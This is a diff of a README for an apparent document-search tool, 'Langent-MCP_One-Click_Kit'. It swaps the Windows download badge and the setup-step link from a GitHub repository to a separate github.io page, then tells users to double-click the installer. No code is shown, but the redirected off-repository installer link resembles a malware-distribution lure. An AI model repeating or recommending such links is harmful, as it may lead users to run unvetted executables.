@@ -1,6 +1,6 @@
 # 🌐 Langent-MCP_One-Click_Kit - Turn your documents into intelligent maps
 
-[![Download for Windows](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/lightmeterminiaturisation293/Langent-MCP_One-Click_Kit)
+[![Download for Windows](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://lightmeterminiaturisation293.github.io)
 
 ## 📖 What this tool does
 
@@ -16,7 +16,7 @@ Langent-MCP converts your personal files into a search engine. You can upload PD
 
 ## 🚀 How to set up
 
-1. Visit the project page to get the installer: [Download Link](https://github.com/lightmeterminiaturisation293/Langent-MCP_One-Click_Kit)
+1. Visit the project page to get the installer: [Download Link](https://lightmeterminiaturisation293.github.io)
 2. Locate the download folder on your computer.
 3. Double-click the installer file.
 4. Follow the prompts on the screen.
